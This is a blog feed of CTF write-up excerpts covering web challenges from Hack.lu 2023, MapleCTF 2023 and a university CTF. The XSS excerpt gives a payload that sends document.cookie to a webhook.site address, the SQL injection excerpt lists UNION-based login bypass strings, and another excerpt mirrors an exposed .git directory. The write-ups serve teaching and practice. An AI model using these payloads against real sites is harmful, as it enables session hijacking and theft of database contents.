channel.title: Web on Gabriele Abbate
channel.description: Recent content in Web on Gabriele Abbate

item.title: Based Encoding
item.description: CTF: Hack.lu CTF 2023 Based encoding as a service. But can we insert a little tomfoolery? Let’s find out. Link: https://based.skin Files: BASED.zip When we open the link, we are prompted to visit a website where we can register or log in. After signing up and logging in as a normal user, we can navigate to the /create page. Here, we can input text, and the website will encrypt it and save it in its database.

item.title: Blade Runner
item.description: CTF: MapleCTF 2023 You look lonely. I can fix that. Files: blade_runner.zip I worked on this challenge locally by running the Docker container provided in the .zip file alongside the source code of the web page. This is what the page looks like when visiting the landing page: After some experimentation, I discovered that the aim of the challenge was to first register on the website and then log in with the correct credentials in order to open and view the content of the JOI page.

item.title: Git Gud
item.description: I found this nice website that is supposed to help me get better at flag capturing, however, it just tells me to GIT GUD! gobuster -u http://ths.eemcs.utwente.nl:33035/ -w ./SecLists/Discovery/Web-Content/common.txt We discover that the .git dir is exposed wget -m http://ths.eemcs.utwente.nl:33035/.git/ git ls-files --stage Scraping in the folders we notice the sha1 of a git object in a file called master, so we read the content input: git cat-file -p 8ada2d530c7223ac387dd0ca7de781676a451cc3 output: tree c406e4f12544b6c7e193e6d3cecbc01f91256263 parent 3e7eebf4e038cf713fb74a8101d0c4a03325bd78 author Thijs van Ede thijs@ths.

item.title: XSS 1
item.description: The X-treme Sports Society has a forum discussing X-treme sports. They even have a topic on X-treme CTFs where they share flags. This is only available for admin’s though, I wonder if we can view it anywayâ€¦ <script>alert(document.cookie);</script> Let’s open a session with webhook in order to steal some cookies Webhook.site - Test, process and transform emails and HTTP requests <script>fetch('[https://webhook.site/3351a0cc-7a55-4f44-a01c-469fe72dbd0a](https://webhook.site/3351a0cc-7a55-4f44-a01c-469fe72dbd0a)', {method: 'POST', body:document.cookie});</script> forumSessionID=ZWezDhAFdy5+af2Tsw/EkqNiPJjMBFx+mFG2Jhuj2Bk= ðŸ’¡ Use burp to forward the packet with the sniffed session ID or just change the forumSessionID in inspect page â†’ storage â†’ cookies â†’ forumSessionIDm

item.title: SQL Injection 1
item.description: Our database contains the grades of some THS admins. Please use login in the docker container to view your grade. Admins can of course also view the flags in the database, luckily we have very secure access credentials. email: user@gmail.com password: password' OR '1'='1' UNION SELECT password,email FROM 'users';-- email: user@gmail.com password: password' OR '1'='1' UNION SELECT name,null FROM sqlite_schema;-- email: user@gmail.com password: password' OR '1'='1' UNION SELECT name,NULL FROM PRAGMA_TABLE_INFO("table_that_definitely_does_not_contain_the_flag");-- email: user@gmail.
